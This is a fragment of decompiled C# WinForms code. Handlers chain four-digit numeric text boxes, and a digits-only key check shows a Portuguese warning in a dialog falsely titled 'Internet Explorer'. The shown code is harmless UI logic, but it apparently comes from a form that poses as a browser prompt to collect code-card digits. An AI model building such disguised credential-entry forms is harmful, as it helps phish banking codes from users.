	private void t34_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t34).get_Text().Length == 4)
		{
			((Control)t35).Focus();
		}
	}

	private void t35_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t35).get_Text().Length == 4)
		{
			((Control)t36).Focus();
		}
	}

	private void t36_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t36).get_Text().Length == 4)
		{
			((Control)t37).Focus();
		}
	}

	private void t37_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t37).get_Text().Length == 4)
		{
			((Control)t38).Focus();
		}
	}

	private void t38_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t38).get_Text().Length == 4)
		{
			((Control)t39).Focus();
		}
	}

	private void t39_TextChanged(object sender, EventArgs e)
	{
		if (((Control)t39).get_Text().Length == 4)
		{
			((Control)t40).Focus();
		}
	}

	private void NaoPrecioneLetra(object sender, KeyPressEventArgs e)
	{
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		string text = Convert.ToString(e.get_KeyChar());
		if (text != "1" && text != "2" && text != "3" && text != "4" && text != "5" && text != "6" && text != "7" && text != "8" && text != "9" && text != "0")
		{
			e.set_Handled(true);
			MessageBox.Show("Digite apenas números", "Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
	}

	private void Painel_sc_Paint(object sender, PaintEventArgs e)
	{
	}
}
